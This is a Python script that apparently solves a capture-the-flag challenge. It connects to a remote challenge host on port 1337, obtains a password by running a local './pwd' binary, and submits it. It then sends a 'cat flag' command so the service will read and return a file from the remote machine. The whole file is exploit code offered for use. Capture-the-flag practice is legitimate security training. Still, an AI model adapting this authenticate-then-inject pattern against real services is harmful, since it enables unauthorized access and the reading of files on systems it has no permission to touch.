import socket
import os
import sys

host = "ec2-18-222-89-163.us-east-2.compute.amazonaws.com"
port = 1337

def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    command = "cat flag                         cat flag                         "

    data = s.recv(1048)
    print(data)

    s.send("3\n")
    data = s.recv(1048)
    print(data)

    os.system("./pwd >> temp.txt")
    os.system("cat temp.txt")
    fl = open("temp.txt", "r")
    pwd = fl.read().split('\n')[0] + '\n'
    print("PWD:")
    print(pwd)
    print("****")

    s.send(pwd)

    data = s.recv(1048)
    print(data)

    s.send("4\n")
    print("Sending 4...")
    data = s.recv(1048)
    print(data)
    s.send(command + "\n")
    print("sending ls...")
    data = s.recv(1048)
    print(data)
    data = s.recv(1048)
    print(data)

    os.system("rm temp.txt")

server()
